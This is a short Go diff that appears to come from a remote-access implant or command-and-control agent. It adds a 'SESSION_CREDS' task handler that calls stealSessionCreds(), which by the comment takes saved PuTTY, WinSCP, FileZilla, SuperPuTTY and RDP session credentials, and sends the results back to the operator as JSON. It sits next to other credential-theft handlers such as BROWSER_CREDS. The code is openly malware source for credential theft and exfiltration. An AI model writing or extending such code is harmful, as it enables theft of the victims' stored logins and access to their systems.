@@ -1110,6 +1110,17 @@ func dispatchTask(t transport, task taskWire) {
 		data, _ := json.MarshalIndent(creds, "", "  ")
 		t.sendResult(task.ID, string(data), "")
 
+	// ── SessionGopher — PuTTY / WinSCP / FileZilla / SuperPuTTY / RDP ────────
+
+	case "SESSION_CREDS":
+		creds, err := stealSessionCreds()
+		if err != nil {
+			t.sendResult(task.ID, "", err.Error())
+			return
+		}
+		data, _ := json.MarshalIndent(creds, "", "  ")
+		t.sendResult(task.ID, string(data), "")
+
 	// ── Browser credentials + Windows Credential Manager ────────────────────
 
 	case "BROWSER_CREDS":
